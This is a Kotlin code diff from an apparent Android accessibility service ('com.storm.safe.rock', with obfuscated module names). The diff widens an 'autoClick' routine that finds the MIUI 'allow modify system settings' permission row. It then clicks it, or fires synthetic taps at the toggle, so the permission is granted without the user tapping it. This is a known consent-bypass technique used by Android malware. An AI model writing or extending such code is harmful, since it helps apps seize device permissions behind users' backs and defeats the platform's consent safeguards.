@@ -2400,36 +2400,56 @@ class MainOrchestrator(
                     performClick(fallback)
                     return true
                 }
-                // MIUI fallback: no Switch on page — find clickable row with "允许修改系统设置"
-                // MIUI's WRITE_SETTINGS page has a clickable ViewGroup row, not a Switch
+                // MIUI fallback: no Switch on page — find clickable row or right-side Switch area
+                // MIUI's WRITE_SETTINGS page has a clickable PreferenceItem row, not an exposed Switch node
                 for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
                     val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
                     for (textNode in nodes) {
-                        // Skip title bar matches
-                        val nodeId = textNode.viewIdResourceName ?: ""
-                        if (nodeId.contains("action_bar")) continue
                         if (!textNode.isVisibleToUser) continue
+                        val nodeId = textNode.viewIdResourceName ?: ""
+                        // Whitelist: android:id/title / summary / PreferenceItemView labels
+                        // (action bar titles use id like "action_bar_title" — skip them)
+                        val isContentTitle = nodeId == "android:id/title" ||
+                            nodeId == "android:id/summary" ||
+                            nodeId.contains("preference", ignoreCase = true)
+                        if (!isContentTitle) {
+                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: skip non-content text id=$nodeId")
+                            continue
+                        }
                         Log.d(TAG, "🔍 [autoClick] MIUI fallback: 找到内容文本「$keyword」(id=$nodeId)")
-                        // Climb parent chain to find clickable ViewGroup
+
+                        // Strategy A: climb parent chain up to 8 levels for clickable ViewGroup
                         var current: AccessibilityNodeInfo? = textNode.parent
                         var depth = 0
-                        while (current != null && depth < 5) {
-                            if (current.isClickable) {
-                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: 点击父容器 depth=$depth class=${current.className}")
+                        while (current != null && depth < 8) {
+                            if (current.isClickable && current.isVisibleToUser) {
+                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy A 点击父容器 depth=$depth class=${current.className}")
                                 performClick(current)
                                 return true
                             }
                             current = current.parent
                             depth++
                         }
-                        // Gesture tap on text center as last resort
+
+                        // Strategy B: gesture tap on right-side Switch area (MIUI Switch is always on the right)
                         val rect = android.graphics.Rect()
                         textNode.getBoundsInScreen(rect)
                         if (rect.width() > 0 && rect.height() > 0) {
-                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: gesture tap at ${rect.centerX()},${rect.centerY()}")
-                            performSwipeGesture(rect.centerX().toFloat(), rect.centerY().toFloat(),
-                                rect.centerX().toFloat(), rect.centerY().toFloat())
-                            return true
+                            val dm = context.resources.displayMetrics
+                            val switchX = (dm.widthPixels - 120).toFloat()  // MIUI Switch typically at right 120px
+                            val switchY = rect.centerY().toFloat()
+                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy B gesture tap right-switch at ($switchX,$switchY)")
+                            val tapped = com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
+                                .performTap(service, switchX, switchY)
+                            if (tapped) {
+                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy B succeeded")
+                                return true
+                            }
+                            // Strategy C: if right-side tap fails, tap text center with real gesture
+                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy C gesture tap text center at ${rect.centerX()},${rect.centerY()}")
+                            val tapped2 = com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
+                                .performTap(service, rect.centerX().toFloat(), rect.centerY().toFloat())
+                            if (tapped2) return true
                         }
                     }
                 }
